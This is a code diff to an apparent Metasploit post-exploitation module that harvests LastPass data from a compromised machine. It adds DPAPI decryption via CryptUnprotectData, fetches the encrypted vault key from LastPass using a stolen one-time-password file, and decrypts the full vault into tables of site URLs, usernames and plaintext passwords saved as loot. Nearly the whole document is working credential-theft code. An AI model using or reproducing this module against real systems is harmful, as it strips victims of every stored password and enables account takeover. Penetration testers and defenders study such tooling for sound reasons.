@@ -29,7 +29,6 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-
     if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
       print_error "Shell sessions on Windows are not supported"
       return
@@ -118,7 +117,11 @@ class Metasploit3 < Msf::Post
         db_paths = find_db_paths(path, browser, account)
         if db_paths && db_paths.size > 0
           account_map[account][browser]['lp_db_path'] = db_paths
-          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser == 'Firefox'
+          if session.type == "meterpreter"
+            account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser == 'Firefox'
+          else # session.type == "shell"
+            account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if session.shell_command("ls \"#{localstorage_path_map[browser]}\"").strip == localstorage_path_map[browser].strip || browser == 'Firefox'
+          end
         else
           account_map[account].delete(browser)
         end
@@ -232,13 +235,13 @@ class Metasploit3 < Msf::Post
       if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
         usernames = encoded_users.split("|")
         usernames.each do |username|
-          credentials << [username, "NOT_FOUND"]
+          credentials << [username, nil]
         end
       elsif /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
         creds_per_user = encoded_creds.split("|")
         creds_per_user.each do |user_creds|
           parts = user_creds.split('=')
-          for creds in credentials # Check iuf we have the username already
+          for creds in credentials # Check if we have the username already
             if creds[0] == parts[0]
               creds[1] = parts[1] # Add the password to the existing username
             else
@@ -297,8 +300,8 @@ class Metasploit3 < Msf::Post
             ffcreds = firefox_credentials(loot_path)
             unless ffcreds.blank?
               ffcreds.each do |creds|
-                if creds[1].blank?
-                  creds[1] = nil # No master password found
+                if creds[1].blank? # No master password found
+                  account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = {'lp_password' => nil} 
                 else
                   sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.unescape(creds[0]))
                   sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
@@ -351,7 +354,7 @@ class Metasploit3 < Msf::Post
         if browser == 'Firefox'
           path = lp_data['localstorage_db'] + client.fs.file.separator + "lp.suid"
           data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
-          data = nil if (data.blank? || data.size != 32) # Verify content
+          data = windows_unprotect(data) if data != nil && data.size > 32 # Verify Windows protection
           loot_path = store_loot(
             'firefox.preferences',
             'text/binary',
@@ -389,15 +392,15 @@ class Metasploit3 < Msf::Post
   #Print all extracted LastPass data
   def print_lastpass_data(account_map)
     lastpass_data_table = Rex::Ui::Text::Table.new(
-      'Header' => "LastPass data",
+      'Header' => "LastPass Accounts",
       'Indent' => 1,
-      'Columns' => %w(Account Browser LP_Username LP_Password LP_2FA LP_Key)
+      'Columns' => %w(Account LP_Username LP_Password LP_2FA LP_Key)
     )
 
     account_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, lp_data|
         lp_data['lp_creds'].each_pair do |username, user_data|
-          lastpass_data_table << [account, browser, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
+          lastpass_data_table << [account, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
         end
       end
     end
@@ -412,6 +415,8 @@ class Metasploit3 < Msf::Post
         nil,
         "LastPass Data"
       )
+
+      print_vault_passwords(account_map)
     end
   end
 
@@ -423,7 +428,7 @@ class Metasploit3 < Msf::Post
           if browser == 'Firefox'
             path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
             iterations = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
-            iterations = "NOT FOUND" if iterations.blank? # Verify content
+            iterations = nil if iterations.blank? # Verify content
             lp_data['lp_creds'][username]['iterations'] = iterations
             loot_path = store_loot(
               "#{browser.downcase}.lastpass.iterations",
@@ -435,8 +440,8 @@ class Metasploit3 < Msf::Post
             )
             path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
             vault = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
-            vault = "NOT FOUND" if vault.blank? # Verify content
-            lp_data['lp_creds'][username]['vault_loot'] = "NOT_FOUND"
+            vault = windows_unprotect(vault) if vault != nil && vault.match(/^AQAAA.+/) # Verify Windows protection
+            vault = vault.sub(/iterations=.*;/, "") # Remove iterations info
             loot_path = store_loot(
               "#{browser.downcase}.lastpass.vault",
               'text/plain',
@@ -445,12 +450,13 @@ class Metasploit3 < Msf::Post
               nil,
               "#{account}'s #{browser} LastPass Vault"
             )
+            lp_data['lp_creds'][username]['vault_loot'] = loot_path
 
           else # Chrome, Safari and Opera
             db = SQLite3::Database.new(lp_data['lp_db_loot'])
             result = db.execute(
               "SELECT data FROM LastPassData " \
-              "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'accts'"
+              "WHERE username_hash = '" + OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'accts'"
             )
 
             if result.size == 1 && !result[0].blank?
@@ -478,8 +484,8 @@ class Metasploit3 < Msf::Post
                 lp_data['lp_creds'][username]['vault_loot'] = loot_path
               end
             else
-              lp_data['lp_creds'][username]['iterations'] = "NOT_FOUND"
-              lp_data['lp_creds'][username]['vault_loot'] = "NOT_FOUND"
+              lp_data['lp_creds'][username]['iterations'] = nil
+              lp_data['lp_creds'][username]['vault_loot'] = nil
             end
           end
         end
@@ -491,11 +497,11 @@ class Metasploit3 < Msf::Post
     account_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, lp_data|
         lp_data['lp_creds'].each_pair do |username, user_data|
-          if !user_data['lp_password'].blank? && user_data['iterations'] != "NOT_FOUND"# Derive vault key from credentials
+          if !user_data['lp_password'].blank? && user_data['iterations'] != nil# Derive vault key from credentials
             lp_data['lp_creds'][username]['vault_key'] = derive_vault_key_from_creds(username, lp_data['lp_creds'][username]['lp_password'], user_data['iterations'])
           else # Get vault key from disabled OTP
-            otp = extract_otp(account, browser, username, lp_data)
-            lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otp)
+            otpbin = extract_otpbin(account, browser, username, lp_data)
+            lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
           end
         end
       end
@@ -503,19 +509,19 @@ class Metasploit3 < Msf::Post
   end
 
   # Returns otp, encrypted_key
-  def extract_otp(account, browser, username, lp_data)    
+  def extract_otpbin(account, browser, username, lp_data)    
     if browser == 'Firefox'
       path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
-      otp = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
-      otp = "NOT FOUND" if otp.blank? # Verify content
-      return otp 
+      otpbin = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+      otpbin = windows_unprotect(otpbin) if otpbin != nil && otpbin.match(/^AQAAA.+/)
+      return otpbin
     else # Chrome, Safari and Opera
       db = SQLite3::Database.new(lp_data['lp_db_loot'])
       result = db.execute(
         "SELECT type, data FROM LastPassData " \
         "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'otp'"
       )
-      result[0][1]
+      [result[0][1]].pack "H*"
     end
   end
 
@@ -524,22 +530,20 @@ class Metasploit3 < Msf::Post
     if key_iteration_count == 1
         key = Digest::SHA256.hexdigest username + password
     else
-        key = pbkdf2(password, username, key_iteration_count.to_i, 32)
+        key = pbkdf2(password, username, key_iteration_count.to_i, 32).first
     end
     
-    key.first
+    key
   end
 
-  def decrypt_vault_key_with_otp username, otp
-    otpbin = [otp].pack "H*"
+  def decrypt_vault_key_with_otp username, otpbin
     vault_key_decryption_key = [lastpass_sha256(username + otpbin)].pack "H*"
-    encrypted_vault_key = retrieve_encrypted_vault_key_with_otp(username, otp)
+    encrypted_vault_key = retrieve_encrypted_vault_key_with_otp(username, otpbin)
     decrypt_data(vault_key_decryption_key, encrypted_vault_key)
   end
 
-  def retrieve_encrypted_vault_key_with_otp username, otp
+  def retrieve_encrypted_vault_key_with_otp username, otpbin
     # Derive login hash from otp
-    otpbin = [otp].pack "H*"
     otp_token = lastpass_sha256( lastpass_sha256( username + otpbin ) + otpbin ) # OTP login hash
 
     # Make request to LastPass
@@ -550,10 +554,6 @@ class Metasploit3 < Msf::Post
     response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) {|http|
       http.request(request)
     }
-
-    puts request.body
-    puts response.body
-
 
     # Parse response
     encrypted_vault_key = nil
@@ -567,9 +567,9 @@ class Metasploit3 < Msf::Post
   # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)
   def lastpass_sha256(input)
     output = ""
-
+    
     input = input.gsub("\r\n", "\n")
-
+    
     input.each_byte do |e|
       if 128 > e
         output += e.chr
@@ -587,11 +587,120 @@ class Metasploit3 < Msf::Post
     OpenSSL::Digest::SHA256.hexdigest(output)
   end
 
-
   def pbkdf2(password, salt, iterations, key_length)
     digest = OpenSSL::Digest::SHA256.new
     OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, key_length, digest).unpack 'H*'
-  end 
+  end
 
+  def windows_unprotect(data)
+    data = Base64.decode64(data)
+    rg = session.railgun
+    pid = session.sys.process.getpid
+    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    mem = process.memory.allocate(data.length+200)
+    process.memory.write(mem, data)
+
+    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+        addr = [mem].pack("V")
+        len = [data.length].pack("V")
+        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+        len, addr = ret["pDataOut"].unpack("V2")
+    else
+        addr = Rex::Text.pack_int64le(mem)
+        len = Rex::Text.pack_int64le(data.length)
+        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+        pData = ret["pDataOut"].unpack("VVVV")
+        len = pData[0] + (pData[1] << 32)
+        addr = pData[2] + (pData[3] << 32)
+    end
+
+    return "" if len == 0
+    process.memory.read(addr, len)
+  end
+
+  def print_vault_passwords(account_map)
+    account_map.each_pair do |account, browser_map|
+      browser_map.each_pair do |browser, lp_data|
+        lp_data['lp_creds'].each_pair do |username, user_data|
+          lastpass_vault_data_table = Rex::Ui::Text::Table.new(
+            'Header' => "Decrypted vault from #{username}",
+            'Indent' => 1,
+            'Columns' => %w(URL Username Password)
+          )
+          if user_data['vault_loot'] == nil # Was a vault found?
+            print_error "No vault was found for #{username}"
+            next
+          end
+          encoded_vault = File.read(user_data['vault_loot'])
+          if encoded_vault[0] == "!" # Vault is double encrypted
+            encoded_vault = decrypt_data([user_data['vault_key']].pack("H*"), encoded_vault)
+            if encoded_vault.blank?
+              print_error "Vault from #{username} could not be decrypted"
+              next
+            else
+              encoded_vault = encoded_vault.sub("LPB64", "") 
+            end
+          end
+
+          # Parse vault
+          vault = Base64.decode64(encoded_vault)
+          vault.scan(/ACCT/) do |result|
+            chunk_length = vault[$~.offset(0)[1]..$~.offset(0)[1]+3].unpack("H*").first.to_i(16) # Get the length in base 10 of the ACCT chunk
+            chunk = vault[$~.offset(0)[0]..$~.offset(0)[1]+chunk_length] # Get ACCT chunk
+            account_data = parse_vault_account(chunk, user_data['vault_key']) 
+            lastpass_vault_data_table << account_data if account_data != nil
+          end
+
+          unless account_map.empty? # Loot passwords
+            print_good lastpass_vault_data_table.to_s
+            path = store_loot(
+              "lastpass.#{username}.passwords",
+              "text/csv",
+              session,
+              lastpass_vault_data_table.to_csv,
+              nil,
+              "LastPass Vault Passwords from #{username}"
+            )
+          end
+        end
+      end
+    end    
+  end
+
+  def parse_vault_account(chunk, vaultKey)
+    pointer = 22 # Starting position to find data to decrypt
+    labels = ["name", "folder", "url", "notes", "undefined", "undefined2", "username", "password"]
+    vault_data = []
+    for label in labels
+      length = chunk[pointer..pointer+3].unpack("H*").first.to_i(16)
+      encrypted_data = chunk[pointer+4..pointer+4+length-1]
+      label != "url" ? decrypted_data = decrypt_vault_password(vaultKey, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
+      decrypted_data = "" if decrypted_data == nil
+      vault_data << decrypted_data if (label == "url" || label == "username" || label == "password") 
+      pointer = pointer + 4 + length
+    end
+    return vault_data[0] == "http://sn" ? nil : vault_data # TODO: Support secure notes
+  end
+
+  def decrypt_vault_password(key, encrypted_data)
+    return nil if key.blank? || encrypted_data.blank?
+
+    if encrypted_data[0] == "!" # Apply CBC
+      decipher = OpenSSL::Cipher.new("AES-256-CBC")
+      decipher.iv = encrypted_data[1, 16] # Discard !
+      encrypted_data = encrypted_data[17..-1]
+    else # Apply ECB
+      decipher = OpenSSL::Cipher.new("AES-256-ECB")
+    end
+    decipher.decrypt
+    decipher.key = [key].pack "H*"
+
+    begin
+      return decipher.update(encrypted_data) + decipher.final
+    rescue
+      vprint_error "Vault password could not be decrypted"
+      return nil
+    end
+  end
 
 end
